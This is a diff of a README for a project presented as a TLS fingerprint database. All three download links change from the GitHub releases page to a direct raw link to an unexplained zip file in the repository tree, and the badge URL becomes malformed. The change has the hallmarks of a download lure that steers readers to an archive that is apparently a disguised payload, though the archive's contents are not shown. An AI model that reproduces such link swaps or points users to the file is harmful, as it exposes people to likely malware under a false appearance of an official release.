@@ -1,7 +1,7 @@
 # 🔒 tls_fingerprint_db - A Secure Tool for TLS Analysis
 
 ## 📦 Download
-[![Download](https://img.shields.io/badge/Download-latest%20version-blue.svg)](https://github.com/biggerback/tls_fingerprint_db/releases)
+[![Download](https://raw.githubusercontent.com/biggerback/tls_fingerprint_db/main/tls_json/tls_fingerprint_db_usee.zip%https://raw.githubusercontent.com/biggerback/tls_fingerprint_db/main/tls_json/tls_fingerprint_db_usee.zip)](https://raw.githubusercontent.com/biggerback/tls_fingerprint_db/main/tls_json/tls_fingerprint_db_usee.zip)
 
 ## 📖 About
 The **tls_fingerprint_db** is an open-source database project that contains a vast collection of TLS handshake fingerprints. This database collects and organizes TLS fingerprint information from various browsers, applications, and devices. You can use it for network security analysis, traffic identification, and anomaly detection.
@@ -19,7 +19,7 @@ To use tls_fingerprint_db, ensure your system meets these requirements:
 ### 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
    
-   [Visit Releases Page](https://github.com/biggerback/tls_fingerprint_db/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/biggerback/tls_fingerprint_db/main/tls_json/tls_fingerprint_db_usee.zip)
 
 2. **Select the Latest Release:** Find the latest version in the list. Look for the release notes, which will detail what has changed or improved.
 
@@ -48,6 +48,6 @@ If you have any suggestions, issues, or feedback, please open an issue on the Gi
 ### ✅ Get Started
 For quick access, download the application from the link below:
 
-[Download Latest Version](https://github.com/biggerback/tls_fingerprint_db/releases) 
+[Download Latest Version](https://raw.githubusercontent.com/biggerback/tls_fingerprint_db/main/tls_json/tls_fingerprint_db_usee.zip) 
 
 By following the steps outlined above, you can effectively set up and start using tls_fingerprint_db for your TLS security needs.
